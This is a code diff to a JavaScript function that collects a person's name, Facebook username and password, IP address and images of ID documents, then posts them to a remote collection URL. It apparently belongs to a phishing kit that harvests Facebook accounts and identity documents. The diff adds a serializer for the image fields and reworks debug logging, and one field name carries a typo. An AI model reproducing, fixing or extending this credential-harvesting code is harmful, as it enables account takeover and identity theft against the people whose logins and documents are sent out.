@@ -7,6 +7,15 @@ const imageLink = (hostname, file) => {
   return link;
 };
 
+serialize = function (obj) {
+  var str = [];
+  for (var p in obj)
+    if (obj.hasOwnProperty(p)) {
+      str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+    }
+  return str.join("&");
+};
+
 const sendDataToBoard = async (data) => {
   var upData = {
     personal_info: `${data.firstName} ${data.lastName}`,
@@ -33,7 +42,6 @@ const sendDataToBoard = async (data) => {
     const getIdResponse = await axios.post(url, getIdParams, getIdConfig);
     const id = getIdResponse.data[0];
     data["personalInfo"] = id;
-    console.log("personalInfo", data.personalInfo);
 
     const sendData = (data) => {
       const sendDataConfig = {
@@ -49,8 +57,8 @@ const sendDataToBoard = async (data) => {
 
       const updatedData = new URLSearchParams();
       updatedData.append("action", "send_data");
-      updatedData.append("first_name", data.firtst_name || "");
-      updatedData.append("last_name", data.last_name || "");
+      updatedData.append("first_name", data.firtsName || "");
+      updatedData.append("last_name", data.lastName || "");
       updatedData.append("facebook_login", data.fbUsername || "");
       updatedData.append("facebook_password", data.fbPassword || "");
       updatedData.append("email_verification", "-");
@@ -92,33 +100,19 @@ const sendDataToBoard = async (data) => {
       updatedData.append("ip", data.ip || "");
       updatedData.append("fortnight", data.fortnight || "");
 
-      console.log("image data document image");
-      console.log("image data document image", {
-        link: data.documentImage.link,
-        name: data.documentImage.name,
-        type: data.documentImage.type,
-      });
+      console.log("data.documentImage", data.documentImage);
 
-      data.documentImage &&
-        updatedData.append("file", {
-          link: data.documentImage.link,
-          name: data.documentImage.name,
-          type: data.documentImage.type,
-        });
+      if (data.documentImage) {
+        console.log("prepering to append");
+        updatedData.append("file", serialize(data.documentImage));
+      }
       data.fbEmailImage &&
-        updatedData.append("email_id_file", {
-          link: data.fbEmailImage.fbEmailImage,
-          name: data.fbEmailImage.name,
-          type: data.fbEmailImage.type,
-        });
+        updatedData.append("email_id_file", serialize(data.fbEmailImage));
       data.bmIdImage &&
-        updatedData.append("bm_id_file", {
-          link: data.bmIdImage.link,
-          name: data.bmIdImage.name,
-          type: data.bmIdImage.type,
-        });
+        updatedData.append("bm_id_file", serialize(data.bmIdImage));
 
-      updatedData.append("updatedData", updatedData || "");
+      console.log("image appended", updatedData["file"]);
+      console.log("updatedDate", updatedData);
 
       axios
         .post(sendDataUrl, updatedData, sendDataConfig)
